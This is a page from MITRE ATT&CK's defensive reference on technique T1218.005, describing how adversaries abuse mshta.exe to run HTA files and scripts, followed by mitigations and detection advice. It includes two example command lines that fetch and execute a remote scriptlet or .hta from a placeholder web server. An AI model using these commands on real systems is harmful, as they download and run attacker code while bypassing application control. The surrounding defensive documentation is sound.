https://attack.mitre.org/techniques/T1218/005/ 3/6System Binary Proxy Execution: Mshta
Adversaries may abuse mshta.exe to proxy execution of malicious .hta ﬁles and Javascript or VBScript through a trusted Windows utility.
There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code 
Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) ﬁles. HTAs are standalone applications that execute using the
same models and technologies of Internet Explorer, but outside of the browser. 
Files may be executed by mshta.exe through an inline script: mshta
vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))
They may also be executed directly from URLs: mshta http[:]//webserver/payload[.]hta
Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of
the Internet Explorer's security context, it also bypasses browser security settings. Other sub-techniques of System Binary Proxy Execution (13)

ID Mitigation Description
M1042 Disable or
Remove Feature
or ProgramMshta.exe may not be necessary within a given environment since its functionality is tied to older
versions of Internet Explorer that have reached end of life.
M1038 Execution
PreventionUse application control conﬁgured to block execution of mshta.exe if it is not required for a given
system or network to prevent potential misuse by adversaries. For example, in Windows 10 and
Windows Server 2016 and above, Windows Defender Application Control (WDAC) policy rules may be
applied to block the mshta.exe application and to prevent abuse.
Detection
ID Data Source Data Component Detects
DS0017 Command Command
ExecutionLook for mshta.exe executing raw or obfuscated script within the command-line.
Compare recent invocations of mshta.exe with prior history of known good arguments
and executed .hta ﬁles to determine anomalous and potentially adversarial activity.
Command arguments used before and after the mshta.exe invocation may also be
useful in determining the origin and purpose of the .hta ﬁle being executed.
DS0022 File File Creation Monitor use of HTA ﬁles. If they are not typically used within an environment then
execution of them may be suspicious
DS0029 Network TraﬃcNetwork
Connection
CreationMonitor for newly constructed network connections that are sent or received by
untrusted hosts.
DS0009 Process Process Creation Use process monitoring to monitor the execution and arguments of mshta.exe.[38]3/22/24, 3:45 PM System Binary Proxy Execution: Mshta, Sub-technique T1218.005 - Enterprise | MITRE ATT&CK®
